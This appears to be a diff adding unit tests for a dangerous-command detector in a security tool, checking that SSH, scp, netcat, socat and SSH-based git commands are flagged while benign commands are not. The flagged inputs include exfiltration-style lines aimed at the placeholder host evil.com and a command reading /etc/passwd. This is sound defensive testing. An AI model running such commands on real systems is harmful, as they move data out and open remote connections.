@@ -1,5 +1,6 @@
 import unittest
 from hermes_aegis.patterns import secrets, crypto
+from hermes_aegis.patterns.dangerous import detect_dangerous_command
 
 class TestSecrets(unittest.TestCase):
     def test_aws_access_key(self):
@@ -42,3 +43,74 @@ class TestCrypto(unittest.TestCase):
     def test_pem_public_key(self):
         self.assertIsNotNone(crypto.PEM_PUBLIC_KEY.search('-----BEGIN PUBLIC KEY-----'))
         self.assertIsNone(crypto.PEM_PUBLIC_KEY.search('BEGIN PUBLIC KEY'))
+
+
+class TestSSHExfiltrationPatterns(unittest.TestCase):
+    """Tests for SSH/non-HTTP exfiltration dangerous command patterns."""
+
+    def _is_dangerous(self, cmd):
+        return detect_dangerous_command(cmd)[0]
+
+    # Should flag
+    def test_ssh_connection(self):
+        self.assertTrue(self._is_dangerous("ssh user@evil.com"))
+
+    def test_ssh_with_command(self):
+        self.assertTrue(self._is_dangerous("ssh user@host cat /etc/passwd"))
+
+    def test_scp_upload(self):
+        self.assertTrue(self._is_dangerous("scp file.txt user@host:"))
+
+    def test_sftp_connection(self):
+        self.assertTrue(self._is_dangerous("sftp user@host"))
+
+    def test_rsync_over_ssh(self):
+        self.assertTrue(self._is_dangerous("rsync -e ssh /data host:"))
+
+    def test_netcat(self):
+        self.assertTrue(self._is_dangerous("nc evil.com 4444"))
+
+    def test_netcat_full(self):
+        self.assertTrue(self._is_dangerous("netcat -l 8080"))
+
+    def test_ncat(self):
+        self.assertTrue(self._is_dangerous("ncat evil.com 22"))
+
+    def test_socat(self):
+        self.assertTrue(self._is_dangerous("socat TCP:evil.com:22 -"))
+
+    def test_git_push_ssh(self):
+        self.assertTrue(self._is_dangerous("git push git@github.com:repo"))
+
+    def test_git_clone_ssh(self):
+        self.assertTrue(self._is_dangerous("git clone git@evil.com:repo.git"))
+
+    def test_git_remote_add_ssh(self):
+        self.assertTrue(self._is_dangerous("git remote add origin git@evil.com:repo"))
+
+    # Should NOT flag
+    def test_git_push_https(self):
+        self.assertFalse(self._is_dangerous("git push https://github.com/repo"))
+
+    def test_git_clone_https(self):
+        self.assertFalse(self._is_dangerous("git clone https://github.com/repo.git"))
+
+    def test_curl(self):
+        self.assertFalse(self._is_dangerous("curl https://example.com"))
+
+    def test_npm_install(self):
+        self.assertFalse(self._is_dangerous("npm install express"))
+
+    def test_pip_install(self):
+        self.assertFalse(self._is_dangerous("pip install requests"))
+
+    def test_cat_ssh_config_not_flagged(self):
+        """Reading .ssh/config is NOT an SSH connection."""
+        self.assertFalse(self._is_dangerous("cat ~/.ssh/config"))
+
+    def test_ls_ssh_dir_not_flagged(self):
+        self.assertFalse(self._is_dangerous("ls -la .ssh/"))
+
+    def test_echo_ssh_mention_not_flagged(self):
+        """Mentioning 'ssh' in text is not dangerous."""
+        self.assertFalse(self._is_dangerous("echo 'use ssh keys'"))
